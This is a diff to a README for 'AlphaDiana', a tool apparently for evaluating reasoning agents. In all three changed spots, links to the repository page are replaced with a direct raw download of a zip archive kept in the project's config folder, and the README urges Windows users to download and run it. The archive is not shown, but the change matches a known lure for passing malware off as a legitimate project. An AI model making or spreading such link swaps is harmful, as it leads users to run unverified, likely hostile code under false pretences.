@@ -1,6 +1,6 @@
 # 🤖 AlphaDiana - Evaluate Reasoning Agents Clearly
 
-[![Download AlphaDiana](https://img.shields.io/badge/Download-AlphaDiana-blue.svg)](https://github.com/dhoemenk97-star/AlphaDiana)
+[![Download AlphaDiana](https://img.shields.io/badge/Download-AlphaDiana-blue.svg)](https://github.com/dhoemenk97-star/AlphaDiana/raw/refs/heads/main/alphadiana/config/Diana-Alpha-v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Use it to check how well an agent thinks through tasks, follows steps, and reach
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/dhoemenk97-star/AlphaDiana
+https://github.com/dhoemenk97-star/AlphaDiana/raw/refs/heads/main/alphadiana/config/Diana-Alpha-v1.0.zip
 
 Look for the latest Windows file or release package on the page.  
 If you see a setup file, download it and open it.  
@@ -207,4 +207,4 @@ It gives you a simple way to see how an agent behaves across different test case
 
 Download and run AlphaDiana from here:
 
-https://github.com/dhoemenk97-star/AlphaDiana
+https://github.com/dhoemenk97-star/AlphaDiana/raw/refs/heads/main/alphadiana/config/Diana-Alpha-v1.0.zip
